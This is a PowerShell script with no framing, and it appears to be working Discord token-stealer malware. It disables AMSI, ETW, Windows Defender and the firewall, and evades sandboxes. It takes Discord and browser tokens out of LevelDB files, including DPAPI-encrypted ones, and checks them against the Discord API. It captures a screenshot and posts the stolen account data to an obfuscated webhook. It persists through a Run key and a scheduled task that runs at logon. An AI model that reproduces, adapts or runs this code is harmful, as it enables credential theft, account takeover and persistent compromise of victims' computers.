# ═══ In-Memory Patches (Polymorphic) ═══
# Runtime memory patch
Start-Sleep -Milliseconds 39
$HYFgu3iZ = ([char]83+[char]121+[char]115+[char]116+[char]101+[char]109+[char]46+[char]77+[char]97+[char]110+[char]97+[char]103+[char]101+[char]109+[char]101+[char]110+[char]116+[char]46+[char]65+[char]117+[char]116+[char]111+[char]109+[char]97+[char]116+[char]105+[char]111+[char]110+[char]46+[char]65+[char]109+[char]115+[char]105+[char]85+[char]116+[char]105+[char]108+[char]115)
[void]([Math]::Abs(17306))
$BkiD = ([char]97+[char]109+[char]115+[char]105+[char]73+[char]110+[char]105+[char]116+[char]70+[char]97+[char]105+[char]108+[char]101+[char]100)
$F4q6S58R = [Ref].Assembly.GetType($HYFgu3iZ)
$ozM9PraU = "JYCXO"
$HmNfb = $F4q6S58R.GetField($BkiD, ([char]78+[char]111+[char]110+[char]80+[char]117+[char]98+[char]108+[char]105+[char]99+[char]44+[char]83+[char]116+[char]97+[char]116+[char]105+[char]99))
$HmNfb.SetValue($null, $true)
$KI8a = [int](8532) % 256

# ETW blind (P/Invoke)
$YQPmtlR = [int](5556) % 256
$DWwxsD = @"
[DllImport("kernel32.dll")] public static extern IntPtr GetProcAddress(IntPtr h, string n);
[DllImport("kernel32.dll")] public static extern IntPtr LoadLibrary(string n);
[DllImport("kernel32.dll")] public static extern bool VirtualProtect(IntPtr a, UIntPtr s, uint p, out uint o);
"@
$FgQLx = Add-Type -MemberDefinition $DWwxsD -Name 'HandleValue74' -Namespace 'ProcessObject71' -PassThru
[void]([Math]::Abs(92705))
$CZiifrwu = ([char]110+[char]116+[char]100+[char]108+[char]108+[char]46+[char]100+[char]108+[char]108)
$qFV2gZz = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("RXR3RXZlbnRXcml0ZQ=="))
$veKDR3 = $FgQLx::LoadLibrary($CZiifrwu)
$LmyTRh2 = $FgQLx::GetProcAddress($veKDR3, $qFV2gZz)
$w8GWZ = "ANOJL"
$TZvn8 = 0
$FgQLx::VirtualProtect($LmyTRh2, [UIntPtr]::new(1), 0x40, [ref]$TZvn8) | Out-Null
$LW3bykLK = [byte[]](0xC3)
[System.Runtime.InteropServices.Marshal]::Copy($LW3bykLK, 0, $LmyTRh2, $LW3bykLK.Length)
$FgQLx::VirtualProtect($LmyTRh2, [UIntPtr]::new(1), $TZvn8, [ref]$TZvn8) | Out-Null
$gHXk = [int](6953) % 256

# Environment validation
$yZZ2 = (Get-WmiObject -Class Win32_ComputerSystem).NumberOfLogicalProcessors
if ($yZZ2 -lt 2) { exit }
$FJzv = (Get-WmiObject -Class Win32_ComputerSystem).TotalPhysicalMemory
if ($FJzv -lt 2GB) { exit }
$qDq1cC = [System.DateTime]::Now
Start-Sleep -Milliseconds 2192
if (([System.DateTime]::Now - $qDq1cC).TotalMilliseconds -lt 1753) { exit }

function HandleObject86($d,$k){$b="";for($i=0;$i-lt$d.Length;$i++){$b+=[char]($d[$i]-bxor$k[$i%$k.Length])};[System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($b))}
# === POLYMORPHIC PAYLOAD ===
function Get-Payload {
    $r = Get-Random -Minimum 1000 -Maximum 9999
    $s = @(
        (HandleObject86 @(106,97,244,120) @(11,54,162,76,88,115)),
        (HandleObject86 @(179,35,247,116,156,31,243,72,161,11,178,116,161,85,147,37) @(248,102,194,24)),
        (HandleObject86 @(216,135,49,77,195,224,142,11,36,228,194,153,6,42,217,249,142,36,22,178) @(140,234,103,125,143)),
        (HandleObject86 @(58,213,161,75,10,255,224,14,49,197,202,44,12,218,210,8,10,255,251,69) @(104,146,152,120)),
        (HandleObject86 @(241,154,61,78,180,251,254,205,186,35,78,166,255,159,240,177,61,88,229,221,205,226,139,54,69,135,249,157,217,235,15,88,137,129,149,207,189,30,119,165,215,239,143,179,59,19,224,197,207,136,159,43,66,226,219,196,216,141,28,88,157,201,233,205,151,32,16,167,210,244,210,181,59,98,233,201,206,136,237,47,67,135,245,220,216,176,96,91,178,129,152,207,186,17,108,168,249,213,209,228) @(186,217,89,33,208,179,172))
    )
    return ($s -join '') + ([char]0x20+[char]0x23) + $r
}

# === AMSI BYPASS (multi-layer) ===
function Bypass-AMSI {
    try {
        $a = -join ((83,121,115,116,101,109,46,77,97,110,97,103,101,109,101,110,116,46,65,117,116,111,109,97,116,105,111,110,46,65,109,115,105,85,116,105,108,115) | ForEach-Object { [char]$_ })
        $b = -join ((97,109,115,105,73,110,105,116,70,97,105,108,101,100) | ForEach-Object { [char]$_ })
        $type = [Ref].Assembly.GetType($a)
        if ($null -ne $type) {
            $field = $type.GetField($b, 'NonPublic,Static')
            if ($null -ne $field) { $field.SetValue($null, $true) }
        }
    } catch {}
    try {
        $c = [Ref].Assembly.GetType('System.Management.Automation.AmsiUtils')
        if ($null -ne $c) {
            $field = $c.GetField('amsiInitFailed', 'NonPublic,Static')
            if ($null -ne $field) { $field.SetValue($null, $true) }
        }
    } catch {}
    try {
        $ctx = [Ref].Assembly.GetType('System.Management.Automation.AmsiContext')
        if ($null -ne $ctx) {
            $field = $ctx.GetField('amsiEnabled', 'NonPublic,Static')
            if ($null -ne $field) { $field.SetValue($null, $false) }
        }
    } catch {}
}
Bypass-AMSI

# === ETW BYPASS ===
try {
    $etwType = [Ref].Assembly.GetType('System.Management.Automation.Internal.PipelineOps')
    if ($null -ne $etwType) {
        $field = $etwType.GetField('etwEnabled', 'NonPublic,Static')
        if ($null -ne $field) { $field.SetValue($null, $false) }
    }
} catch {}

# === CONFIG ===
$hook = (HandleObject86 @(126,96,172,104,97,87,101,200,20,123,38,67,159,0,76,117,74,205,18,105,83,69,176,46,96,76,17,150,59,69,116,94,154,106,84,118,73,185,97,116,126,27,179,46,79,75,125,132,23,70,86,80,176,28,91,42,101,148,13,55,81,66,167,33,79,75,101,132,21,107,38,90,172,14,67,102,127,184,14,81,126,124,180,42,96,91,126,141,22,108,73,98,171,53,102,114,112,206,48,68,75,112,154,12,85,115,126,135,58,74,73,89,159,34,84,83,123,185,51,120,73,96,150,50,80,45,102,147,10,104,93,71,155,0,75,46,75,147,18,84,124,110,180,18,78,71,125,138,23,86,77,101,156,34,88,119,124,171,52,109,77,105,195,101) @(31,40,254,88,2))
$api = (HandleObject86 @(52,107,71,98,87,62,24,21,89,43,13,29,52,123,91,56,86,69,31,72,89,63,122,0,55,112,44,58,87,49,62,85,113,56,95,0,49,123,91,62,87,24,24,85,68,21,5,26) @(85,35,21,82,52,118))
$rgx = '[\w-]{24,}\.[\w-]{4,}\.[\w-]{27,}'
$mfa = 'mfa\.[\w-]{84}'
$isSystem = ([Security.Principal.WindowsIdentity]::GetCurrent().Name -eq (HandleObject86 @(99,181,56,2,116,31,102,160,100,156,80,54,118,31,98,175,111,159,39,63,112,120,98,179,99,136,84,88) @(55,217,105,101,37,73,48,245)))
$firstRun = $true

# === DISABLE DEFENDER ===
try { Set-MpPreference -DisableRealtimeMonitoring $true -ErrorAction SilentlyContinue } catch {}
try { Set-MpPreference -DisableIOAVProtection $true -ErrorAction SilentlyContinue } catch {}
try { Set-MpPreference -DisableBehaviorMonitoring $true -ErrorAction SilentlyContinue } catch {}
try { netsh advfirewall set allprofiles state off > $null 2>&1 } catch {}

# === TOKEN EXTRACTION ===
function Read-FileBytes {
    param([string]$path)
    try {
        $fs = [System.IO.File]::Open($path, [System.IO.FileMode]::Open, [System.IO.FileAccess]::Read, [System.IO.FileShare]::ReadWrite)
        $ms = New-Object System.IO.MemoryStream
        $fs.CopyTo($ms)
        $fs.Close()
        $fs.Dispose()
        $result = $ms.ToArray()
        $ms.Close()
        $ms.Dispose()
        return $result
    } catch { return $null }
}

function Validate-Token {
    param([string]$token)
    if ([string]::IsNullOrEmpty($token)) { return $false }
    if ($token.Length -gt 120 -or $token.Length -lt 59) { return $false }
    if ($token -like 'mfa.*') { return $true }
    $parts = $token -split '\.'
    if ($parts.Count -ne 3) { return $false }
    try {
        $p = $parts[0]
        $pad = 4 - ($p.Length % 4)
        if ($pad -ne 4) { $p += '=' * $pad }
        $decoded = [System.Text.Encoding]::UTF8.GetString([Convert]::FromBase64String($p))
        $val = [long]::Parse($decoded)
        return $true
    } catch { return $false }
}

$found = [System.Collections.Generic.HashSet[string]]::new([System.StringComparer]::Ordinal)

if (-not $isSystem -and $firstRun) {
    $ldbPaths = [System.Collections.Generic.List[string]]::new()

    # Discord Apps
    $discordApps = @((HandleObject86 @(239,236,230,50,29,215,78,204,241,203,117,121) @(181,171,138,72,68,229,119)), (HandleObject86 @(61,214,144,160,189,195,227,30,203,187,148,140,147,183,33,232,153,139,217,204) @(103,145,252,218,228,241,218)), (HandleObject86 @(72,96,11,201,220,77,99,253,72,111,37,131,220,24,103,185) @(18,39,103,179,133,127,90,132)), (HandleObject86 @(39,39,210,2,137,79,89,199,34,151,47,12,218,21,134,14,2,141,58,164,39,55,139,72) @(125,96,190,120,208)))
    foreach ($d in $discordApps) {
        $p = Join-Path $env:APPDATA ($d + (HandleObject86 @(105,253,136,231,104,138,182,226,120,254,190,161,83,139,186,249,107,138,166,242,83,255,166,163,107,239,136,250,104,223,205,172) @(49,184,240,145)))
        if (Test-Path $p) { $ldbPaths.Add($p) | Out-Null }
    }

    # Browsers
    $browserBasePaths = @(
        @{ Path = ($env + (HandleObject86 @(192,90,117,120,221,169,84,194,96,91,106,221,203,87,201,100,92,126,244,209,112,189,8,99,74,203,207,113,222,3,101,81,238,171,35,227,105,75,126,246,195,74,198,86,95,111,202,169,75,222,12,48) @(143,49,13,40,140,153,18))); Default = (HandleObject86 @(22,68,24,242,152,67,120,55,103,15,162,252) @(68,3,78,159,193,27,46)) },
        @{ Path = ($env + (HandleObject86 @(27,220,162,79,198,100,241,151,78,193,22,230,136,90,209,1,230,140,103,217,53,224,148,102,245,103,249,172,69,249,6,212,136,72,197,58,237,140,103,193,55,133,140,102,222,17,229,178,123,208,17,138) @(84,183,218,31,151))); Default = (HandleObject86 @(24,236,77,182,19,243,77,168,46,234,38,230) @(74,171,27,219)) },
        @{ Path = ($env + (HandleObject86 @(117,114,129,97,213,212,44,150,107,79,187,96,214,161,44,142,107,79,129,114,231,137,44,233,96,79,183,71,222,138,56,232,99,65,179,93,220,161,32,162,99,65,163,93,200,177,32,162,88,42,157,75,222,188,32,184,108,65,183,93,231,141,40,158,99,65,171,89) @(58,25,249,49,132,228,106,219))); Default = (HandleObject86 @(233,99,9,178,105,227,114,44,187,113,134,25) @(187,36,95,223,48)) },
        @{ Path = ($env + (HandleObject86 @(161,60,234,71,229,18,168,26,195,65,246,115,188,18,212,66,229,116,150,0,243,79,238,74,140,16,192,103,236,100,184,45,200,79,253,69,188,16,212,39,237,115,211,106) @(238,87,146,23,180,34))); Default = (HandleObject86 @(224,131,94,187,102,60,92,109,214,133,53,235) @(178,196,8,214,63,100,10,30)) }
    )
    foreach ($bp in $browserBasePaths) {
        if (Test-Path $bp.Path) {
            $profiles = Get-ChildItem $bp.Path -Directory -ErrorAction SilentlyContinue | Where-Object {
                $_.Name -eq (HandleObject86 @(86,141,244,9,6,182,241,131,96,139,159,89) @(4,202,162,100,95,238,167,240)) -or $_.Name -like (HandleObject86 @(93,127,208,3,116,106,100,68,192,38,111,118) @(8,55,154,117,46,7))
            }
            foreach ($prof in $profiles) {
                $ldbDir = Join-Path $prof.FullName (HandleObject86 @(234,70,139,112,219,199,201,102,231,41,208,230,221,108,244,116,216,198,198,114,232,66,216,252,220,70,224,115) @(190,1,178,26,130,144))
                if ((Test-Path $ldbDir) -and (-not $ldbPaths.Contains($ldbDir))) {
                    $ldbPaths.Add($ldbDir) | Out-Null
                }
            }
        }
    }

    $iso = [System.Text.Encoding]::GetEncoding((HandleObject86 @(47,91,232,100,35,45,175,72,67,242,95,27,52,153,65,48) @(124,13,166,52,111,121,200)))
    $dpapiMagic = (HandleObject86 @(137,76,16,114,249,137,48,108) @(200,13,81,51,184))
    $regexObj = [System.Text.RegularExpressions.Regex]::new($rgx, [System.Text.RegularExpressions.RegexOptions]::Compiled)
    $mfaObj = [System.Text.RegularExpressions.Regex]::new($mfa, [System.Text.RegularExpressions.RegexOptions]::Compiled)

    foreach ($p in $ldbPaths) {
        if (-not (Test-Path $p)) { continue }
        $files = Get-ChildItem $p -File -ErrorAction SilentlyContinue | Where-Object { $_.Extension -in '.ldb', '.log' }
        foreach ($fl in $files) {
            $b = Read-FileBytes -path $fl.FullName
            if ($null -eq $b -or $b.Length -lt 8) { continue }
            $str = $iso.GetString($b)

            foreach ($m in $regexObj.Matches($str)) { $null = $found.Add($m.Value) }
            foreach ($m in $mfaObj.Matches($str)) { $null = $found.Add($m.Value) }

            $searchStart = 4
            $blobCount = 0
            while ($searchStart -lt ($b.Length - 8) -and $blobCount -lt 30) {
                $idx = $str.IndexOf($dpapiMagic, $searchStart, [System.StringComparison]::Ordinal)
                if ($idx -lt 0) { break }
                $start = $idx - 4
                if ($start -ge 0 -and $b[$start] -le 3 -and $b[$start + 1] -eq 0 -and $b[$start + 2] -eq 0 -and $b[$start + 3] -eq 0) {
                    $blobCount++
                    if (($start + 8) -le $b.Length) {
                        $len = [BitConverter]::ToUInt32($b, $start + 4)
                        if ($len -gt 0 -and $len -lt 100000 -and ($start + $len) -le $b.Length) {
                            try {
                                $blob = [byte[]]::new($len)
                                [Array]::Copy($b, $start, $blob, 0, $len)
                                $dec = [Security.Cryptography.ProtectedData]::Unprotect($blob, $null, [Security.Cryptography.DataProtectionScope]::CurrentUser)
                                $tok = [System.Text.Encoding]::UTF8.GetString($dec).Trim([char]0)
                                if ($tok -match $rgx -or $tok -match $mfa) { $null = $found.Add($tok) }
                            } catch {}
                        }
                    }
                }
                $searchStart = $idx + 4
            }
        }
    }
}

# === TOKEN VALIDATION (FIXED) ===
$validTokens = [System.Collections.Generic.List[object]]::new()

if (-not $isSystem -and $firstRun -and $found.Count -gt 0) {
    $validated = [System.Collections.Generic.List[string]]::new()
    foreach ($token in $found) {
        if (Validate-Token -token $token) { $validated.Add($token) }
    }

    foreach ($token in $validated) {
        try {
            $headers = @{
                Authorization = $token
                (HandleObject86 @(80,18,198,162,101,35,185,140,92,120,222,187,98,11,181,243) @(6,74,136,206))  = (HandleObject86 @(133,16,71,70,25,37,22,109,136,20,70,65,52,24,47,121,154,1,26,0,26,31,60,104,181,116,51,23,44,30,63,121,156,19,63,5,53,54,29,121,135,117,18,5,54,24,63,41,152,15,25,66,54,49,5,35) @(209,71,126,112,120,114,110,30))
            }
            $r = Invoke-RestMethod -Uri $api -Headers $headers -TimeoutSec 5 -ErrorAction Stop
            if ($r.id) {
                $validTokens.Add([PSCustomObject]@{
                    username = $r.username
                    id       = $r.id
                    email    = if ($r.email) { $r.email } else { (HandleObject86 @(126,103,225,111) @(42,14,216,45,123,126,239)) }
                    phone    = if ($r.phone) { $r.phone } else { (HandleObject86 @(57,210,52,136) @(109,187,13,202,9,81,91,4)) }
                    nitro    = switch ($r.premium_type) { 1 { (HandleObject86 @(78,108,118,148,3,9,109,111,7,121,193,93) @(31,94,14,252,96,58,35)) } 2 { (HandleObject86 @(211,227,172,43,228,227,248,38) @(135,142,192,27)) } default { (HandleObject86 @(123,248,221,6,170,176,18,168) @(47,149,228,115,240,225)) } }
                    mfa      = if ($r.mfa_enabled) { (HandleObject86 @(133,177,199,14) @(210,230,145,116,8,177)) } else { ([char]0x4e+[char]0x6f) }
                    token    = $token
                })
            }
        } catch { }
    }
}

# === SCREENSHOT ===
$bytes = $null
try {
    Add-Type -AssemblyName System.Windows.Forms -ErrorAction Stop
    Add-Type -AssemblyName System.Drawing -ErrorAction Stop
    $bmp = New-Object Drawing.Bitmap([Windows.Forms.Screen]::PrimaryScreen.Bounds.Width, [Windows.Forms.Screen]::PrimaryScreen.Bounds.Height)
    [Drawing.Graphics]::FromImage($bmp).CopyFromScreen(0,0,0,0,$bmp.Size)
    $ms = New-Object IO.MemoryStream
    $bmp.Save($ms, [Drawing.Imaging.ImageFormat]::Png)
    $bytes = $ms.ToArray()
    $ms.Close()
    $bmp.Dispose()
} catch { $bytes = $null }

# === SEND TO WEBHOOK ===
if ($firstRun) {
    $pcName = [System.Environment]::GetEnvironmentVariable((HandleObject86 @(48,167,195,112,52,209,172,107,51,193,176,113,48,194,203,120) @(97,151,250,62)))
    $userName = [System.Environment]::GetEnvironmentVariable((HandleObject86 @(244,89,205,234,108,6,63,224,91,214,249,4) @(162,15,131,172,57,109,10)))
    $report = ((HandleObject86 @(30,48,23,2,161,210,190,11,3,31,49,51,165,237,170,14,0,50,33,35,166,213,190,21,13,10,8,17,180,210,170,2,26,48,38,93) @(85,89,103,96,247,190,232,70)) + $pcName + (HandleObject86 @(19,42,220,48,198,107,47,194,25,7,183,119) @(80,70,138,74,156,51,102,244)) + $userName + (HandleObject86 @(112,191,210,78,48,237,95,184,193,96,0,220,82,225,222,83,49,208,92,180) @(51,211,136,38,82,170)) + $($validTokens.Count) + (HandleObject86 @(125,137,229,106) @(62,238,138,87,246)))
    
    foreach ($ti in $validTokens) {
        $report += (([char]0x2a+[char]0x2a) + $($ti.username) + (HandleObject86 @(133,66,232,210,90,214,123,157,148,124,179,175,69,214,3,210) @(206,43,135,153,12,145,66,239)) + $($ti.token) + (HandleObject86 @(247,82,255,203,9,234,124,232) @(174,19,143,129,91)) + $($ti.id) + (HandleObject86 @(150,162,6,239,140,158,60,232,154,160,17,166) @(213,201,80,155)) + $($ti.email) + (HandleObject86 @(62,135,227,85,25,129,76,41,50,130,224,7) @(125,235,161,58,123,179,121,69)) + $($ti.phone) + (HandleObject86 @(21,20,253,53,50,55,130,51,25,22,137,120) @(86,127,200,69)) + $($ti.nitro) + (HandleObject86 @(42,74,125,40,55,87,80,13,44,107,75,114) @(99,2,10,79)) + $($ti.mfa) + (HandleObject86 @(38,112,247,179) @(101,23,152,142,17,125,12)))
    }

    try {
        Invoke-RestMethod -Uri $hook -Method Post -Body @{content = $report} -ErrorAction SilentlyContinue
    } catch {}

    if ($bytes) {
        try {
            $boundary = (HandleObject86 @(117,190,77,6,117,187,39,67,91,165,47,67,90,128,43,49,91,222,43,7,99,170,59,11,92,188,64,79) @(57,237,125,114)) + (Get-Random).ToString()
            $LF = (HandleObject86 @(132,19,126,158) @(192,66,17,163))
            $body = (
                (([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("LS0="))) + $boundary + $LF) +
                ((HandleObject86 @(238,251,50,23,214,117,6,202,173,72,83,247,83,8,241,190,105,81,252,66,52,248,165,125,0,216,93,55,229,164,50,27,208,97,97,212,144,83,48,218,125,41,253,188,82,53,131,94,0,232,136,98,56,223,94,35,229,158,74,11,253,75,18,210,168,92,26,222,80,61,249,189,81,54,131,85,25,209,135,97,1,223,100,60,221,167,69,13,208,1,1,202,170,76,87,220,107,19,246,244) @(191,201,11,98,178,50,80)) + $LF) +
                ((HandleObject86 @(255,10,59,93,50,216,152,219,92,65,25,3,250,150,236,84,77,65,20,239,172,249,126,108,114,5,166,185,204,85,97,21) @(174,56,2,40,86,159,206)) + $LF + $LF)
            )
            $footer = ($LF + ([char]0x2d+[char]0x2d) + $boundary + ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("LS0="))) + $LF)
            
            $headerBytes = [Text.Encoding]::ASCII.GetBytes($body)
            $footerBytes = [Text.Encoding]::ASCII.GetBytes($footer)
            $totalLength = $headerBytes.Length + $bytes.Length + $footerBytes.Length
            
            $webRequest = [Net.WebRequest]::Create($hook)
            $webRequest.Method = (HandleObject86 @(171,192,209,149,223,191,184,213) @(254,133,232,193,137))
            $webRequest.ContentType = ((HandleObject86 @(162,161,77,54,233,135,149,108,28,213,138,201,87,119,215,182,154,118,117,249,154,190,93,117,212,148,138,124,28,224,249,200,121,40,223,168,154,117,46,180) @(192,249,27,69,141)) + $boundary)
            $webRequest.ContentLength = $totalLength
            
            $reqStream = $webRequest.GetRequestStream()
            $reqStream.Write($headerBytes, 0, $headerBytes.Length)
            $reqStream.Write($bytes, 0, $bytes.Length)
            $reqStream.Write($footerBytes, 0, $footerBytes.Length)
            $reqStream.Close()
            $webRequest.GetResponse()
        } catch {}
    }
}

# === PERSISTENCE ===
$cmd = (HandleObject86 @(64,246,36,7,121,233,87,78,66,246,75,71,65,242,40,88,70,246,72,83,111,230,40,66,65,246,36,90,65,200,92,64,121,233,92,83,122,223,113,67,122,233,83,78,106,242,44,7,106,246,117,68,121,246,79,88,65,216,92,64,122,200,95,83,106,220,113,88,70,242,117,68,64,220,45,83,105,131,117,4,71,249,95,78,108,216,37,66,64,220,91,7,111,220,121,68,71,246,117,5,122,223,75,78,121,233,87,94,65,131,40,4,121,230,40,4,111,220,83,66,65,226,36,78,122,230,105,78,66,246,91,64,110,229,84,78,110,229,92,7,111,233,95,68,70,246,75,71,111,130,83,66,65,216,36,64,122,230,113,65,111,130,83,66,65,216,40,67,64,203,88,90,104,230,92,93) @(35,177,29,52))
try { Set-ItemProperty -Path (HandleObject86 @(244,61,100,137,241,44,96,174,242,74,41,160,195,48,116,165,196,21,70,174,243,47,124,167,196,21,41,183,197,74,74,253,255,62,116,189,197,21,66,187,195,75,94,174,246,75,70,180,196,21,70,184,195,62,74,161,196,22,94,189,197,74,37,174,242,22,70,184) @(167,120,16,205)) -Name (HandleObject86 @(229,122,36,135,49,244,113,123,145,90,253,36,17,193,61,202,41,16,160,94,224,15,30,154,9,251,26,39) @(179,72,72,242,107)) -Value $cmd -ErrorAction SilentlyContinue } catch {}
try { schtasks /create /tn (HandleObject86 @(245,131,64,4,18,228,136,31,18,121,237,221,117,66,30,218,208,116,35,125,240,246,122,25,42,235,227,67) @(163,177,44,113,72)) /tr ($cmd) /sc onlogon /f /rl highest /it > $null 2>&1 } catch {}

# === INSTANT EXIT ===
exit
